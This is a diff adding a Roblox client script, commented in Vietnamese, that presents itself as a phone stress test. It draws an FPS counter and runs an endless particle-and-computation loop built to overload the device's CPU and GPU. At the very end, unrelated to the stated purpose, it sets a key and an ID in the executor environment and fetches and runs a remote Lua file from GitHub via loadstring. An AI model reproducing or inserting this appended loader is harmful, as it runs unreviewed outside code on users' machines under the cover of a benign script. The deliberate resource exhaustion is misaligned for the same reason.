@@ -1,0 +1,80 @@
+-- LOCAL SCRIPT: POCO X7 PRO STRESS TEST (SUB-10 FPS TARGET)
+-- Vị trí đặt: StarterPlayer -> StarterPlayerScripts
+
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- ====================================================================
+-- PHẦN 1: ĐỒNG HỒ ĐO FPS SIÊU NHỎ Ở GÓC MÀN HÌNH
+-- ====================================================================
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MiniFpsCounter"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = PlayerGui
+
+local fpsLabel = Instance.new("TextLabel")
+fpsLabel.Size = UDim2.new(0, 40, 0, 10)
+fpsLabel.Position = UDim2.new(0, 5, 0, 5)
+fpsLabel.BackgroundTransparency = 1
+fpsLabel.TextColor3 = Color3.fromRGB(255, 0, 0) -- Màu đỏ cảnh báo
+fpsLabel.TextSize = 8
+fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
+fpsLabel.TextYAlignment = Enum.TextYAlignment.Top
+fpsLabel.Font = Enum.Font.SourceSansBold
+fpsLabel.Text = "FPS: --"
+fpsLabel.Parent = screenGui
+
+local fpsCount = 0
+local nextUpdate = os.clock() + 1
+
+RunService.RenderStepped:Connect(function()
+	fpsCount = fpsCount + 1
+	local now = os.clock()
+	if now >= nextUpdate then
+		fpsLabel.Text = "FPS: " .. fpsCount
+		fpsCount = 0
+		nextUpdate = now + 1
+	end
+end)
+
+-- ====================================================================
+-- PHẦN 2: VÒNG LẶP VÔ HẠN (INFINITE LOOP) ÉP KIỆT CPU & GPU
+-- ====================================================================
+
+-- Tạo một mỏ neo ngay trước mặt camera để xả hiệu ứng đồ họa nặng
+local attachment = Instance.new("Attachment")
+attachment.Parent = workspace:WaitForChild("Terrain")
+
+-- Cấu hình hạt hiệu ứng để hành hạ GPU của điện thoại
+local particle = Instance.new("ParticleEmitter")
+particle.Rate = 50000 -- Xả 50.000 hạt cùng lúc
+particle.Speed = NumberRange.new(5, 10)
+particle.Lifetime = NumberRange.new(5, 5)
+particle.SpreadAngle = Vector2.new(360, 360)
+particle.Parent = attachment
+
+-- Luồng vòng lặp vô hạn (Infinite Loop)
+task.spawn(function()
+	while true do
+		-- Cập nhật vị trí hạt hiệu ứng luôn dính vào mắt người chơi để ép GPU phải render
+		local camera = workspace.CurrentCamera
+		if camera then
+			attachment.WorldPosition = camera.CFrame.Position + (camera.CFrame.LookVector * 3)
+		end
+
+		-- Vòng lặp tính toán ma trận siêu nặng ép CPU nghẽn cổ chai
+		-- Poco X7 Pro chip rất mạnh nên cần số vòng lặp lớn (3.000.000 phép tính mỗi chu kỳ)
+		for i = 1, 3000000 do
+			local ma_tran = CFrame.new(i, i, i) * CFrame.Angles(i, i, i)
+		end
+		
+		-- Lệnh nhường nhịn siêu ngắn (0 giây) để tránh việc điện thoại tự sập/văng Roblox
+		task.wait(0) 
+	end
+end)
+
+getgenv().Key = "MARU-5MQIF-3T2E-LVLG-RBRSY-7Q4HH"
+getgenv().id = "1224185899034742906"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xshiba/MaruBitkub/main/Mobile.lua"))()
